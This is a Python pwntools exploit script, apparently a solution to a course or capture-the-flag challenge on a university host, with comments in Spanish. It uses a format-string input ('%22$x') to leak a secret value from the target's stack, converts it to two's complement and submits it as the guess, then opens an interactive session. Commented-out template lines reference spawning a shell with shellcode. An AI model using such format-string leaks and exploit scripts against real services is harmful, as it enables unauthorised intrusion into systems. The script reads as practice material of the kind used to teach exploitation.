#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host ic.catedras.linti.unlp.edu.ar --port 15021
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'ic.catedras.linti.unlp.edu.ar'
port = int(args.PORT or 15021)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def hex_to_twos_complement(num, bits=32):

    # Verificar si el número debe ser negativo en complemento a 2
    if num >= 2**(bits - 1):
        num -= 2**bits 

    return num


io = start()

io.recvuntil(b">")

nombre = "%22$x\n"
io.send(nombre)

io.recvuntil(b"adivinanzas, ")
hexa_secreto = io.recvline().strip()  # Captura la dirección

print(f"Hexa {hexa_secreto}")
# Convierte la dirección en un entero
numero_secreto = int(hexa_secreto.decode(), 16)

print(f"Numero {numero_secreto}")

complemento_a_dos = hex_to_twos_complement(numero_secreto)
print(f"COmplemento a 2 {complemento_a_dos}")
# Avanza hasta que pida el input
io.recvuntil(b">")

payload = f"{complemento_a_dos}\n"
io.send(payload)


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()
